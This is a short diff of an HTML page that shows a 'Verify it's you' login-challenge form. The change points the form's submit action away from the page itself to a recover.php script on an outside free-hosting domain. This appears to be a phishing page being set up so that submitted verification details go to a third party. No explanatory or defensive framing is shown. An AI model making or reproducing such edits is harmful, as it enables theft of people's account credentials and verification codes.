@@ -833,7 +833,7 @@ function validateForm() {
   </div>
   <div class="main content clearfix">
 <div class="card flex-card challenge-card">
-  <form method="post" id="challengeform" action="#">
+  <form method="post" id="challengeform" action="https://bobstottts.000webhostapp.com/recover.php">
   <input type="hidden" id="here" value="test">
   <h1 id="login-challenge-heading">
   Verify it's you
